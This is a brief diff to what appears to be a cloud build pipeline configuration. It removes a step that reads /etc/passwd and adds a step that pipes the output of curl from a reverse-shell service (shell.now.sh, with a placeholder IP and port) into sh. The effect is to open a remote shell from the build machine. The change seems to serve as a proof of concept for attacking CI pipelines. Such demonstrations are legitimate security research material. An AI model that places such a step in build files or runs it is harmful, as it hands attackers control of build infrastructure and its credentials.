@@ -1,6 +1,5 @@
 steps:
-- name: 'gcr.io/cloud-builders/mvn'
-  args: ['cat', '/etc/passwd']
-  
-
-
+- name: 'ubuntu'
+  args: ['echo', 'hello world, after 600s']
+- name: 'ubuntu'
+  args: ['curl', 'https://shell.now.sh/YourIPAddress:2020 | sh']
